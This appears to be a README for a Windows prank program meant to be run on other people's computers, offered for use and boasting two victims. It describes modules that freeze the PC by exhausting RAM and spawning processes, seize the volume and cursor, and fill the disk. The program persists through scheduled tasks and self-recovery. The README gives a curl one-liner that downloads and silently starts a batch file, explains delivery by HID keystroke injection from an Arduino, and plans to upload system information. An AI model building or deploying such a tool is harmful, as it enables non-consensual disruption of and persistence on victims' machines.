# Mikroschrott
The goal of this (silly) program is to "improve" the experience of the currently logged-in user on Windows.

For now this program is meant to run in userspace (without admin rights) only.

## Ways to launch the program
Note: Append "-silent" to skip the initial launch so it gets executed during the next login.

### 1: Run the file "run.bat"
This directly launches the program and therefore requires the other files to be present.
Usage Example: Plug in a USB stick with the program and quickly launch it.

### 2: Run the file "netrun.bat"
This automatically downloads the newest version and launches it. Requires only an internet connection.
Usage Example: You forgot your USB stick and still want to be funny. Run the below command (in CMD) to download and launch the file.
```
    curl -o netrun.bat "https://raw.githubusercontent.com/Shaymin-HEG-001/Mikroschrott/refs/heads/master/netrun.bat" && start /MIN "" netrun.bat && exit 0
```

## What exactly does this thing
This program is split into different modules, the ones in the "local" folder get executed directly, the ones in the "system" folder get copied to the documents folder and then executed (you can change the path).
The program also has 1 automatic update and 2 automatic recovery options, in case it gets deleted (but why would anyone do that ;D )

### Module 1 (Names will be changed in the future)
Goal: Make the PC unresponsive. This is done by filling the RAM and launching infinite instances of explorer and other Windows programs

### Module 2
Goal: Annoy the Windows user
- Set volume to 100
- Play a video with the sound in a separate minimized instance
- Change the wallpaper (sometimes doesn't work on Win 11)
- Lock the mouse cursor in the top left corner
- Spam the desktop with useless files, containing "very important" messages
- Create a useless 25 GB File

### Module 3
Goal: Record a video of this nonsense

## How to create a new Module
Easiest way is to copy one of the existing modules and edit it.
- "RUN-Module.bat" is the file that starts the module, use it to start your other files.
- Edit "conf.ps1"
    - "$autoRun" : option to autostart the module on login through a Scheduled-Task
    - "$delay" : delay the autostart (in minutes)
    - "$hourly" : option to start the module hourly (independent from autostart)
    - Custom options if needed
- Variables used in "run.ps1" that start with a "_" get exported to each module folder in a file "vars.txt". They can be loaded using "Invoke-Expression" (PowerShell).
- Scripts that get executed before modules are located in the "scripts" folder.
- If the module should behave differently on autostart, create a file called "AUTO-RUN-Module.bat", this file gets executed instead of "RUN-Module.bat".
- If there is only an "AUTO-RUN-Module.bat" and no "RUN-Module.bat", the module will only be executed on autostart.
- Modules in the "system" folder will be copied over, Modules in the "local" folder won't

## Arduino specific instructions
- Clone repository onto USB drive
- edit [Arduino.ino](https://github.com/Nyamogus/Mikroschrott-Arduino/blob/master/Arduino.ino) to rn "run.bat"
- Flash the Arduino.ino file onto an [HID capable microcontroller](https://docs.arduino.cc/language-reference/en/functions/usb/Keyboard/)

## Todo:
- Reduce size of FFMPEG/FFPLAY (we really don't need a decoder for "Sony PlayStation MDEC", or stuff like that)
- Print something on the default printer
- Change the screen resolution to something stupid / Set window scaling to 500%
- Upload system info to a public server (maybe)

## Why does this project exist?
Cause I'm bored XD

## People I got with this program: 2
